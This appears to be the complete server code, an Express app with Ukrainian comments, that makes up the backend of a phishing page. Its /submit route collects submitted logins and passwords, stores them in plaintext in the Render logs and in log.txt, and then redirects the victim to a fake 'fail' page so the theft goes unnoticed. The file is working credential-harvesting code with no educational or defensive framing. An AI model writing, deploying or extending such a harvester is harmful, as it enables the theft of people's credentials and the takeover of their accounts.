const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Приймає дані з HTML-форми
app.use(express.urlencoded({ extended: true }));

// Віддає статичні файли з public/
app.use(express.static(path.join(__dirname, 'public')));

// POST-запит з форми
app.post('/submit', (req, res) => {
  const { login, password } = req.body;
  const entry = `${new Date().toISOString()} | Логін: ${login} | Пароль: ${password}\n`;

  // 1. Вивід у логи Render
  console.log(entry);

  // 2. Запис у файл log.txt (опційно)
  fs.appendFile('log.txt', entry, err => {
    if (err) {
      console.error('Помилка запису:', err);
      return res.status(500).send('Серверна помилка');
    }

    // 3. Перенаправлення на fail.html
    res.redirect('/fail.html');
  });
});

// Обробка всіх інших маршрутів (опціонально)
app.use((req, res) => {
  res.status(404).send('Сторінка не знайдена');
});

app.listen(PORT, () => {
  console.log(`Сервер запущено на порту ${PORT}`);
});
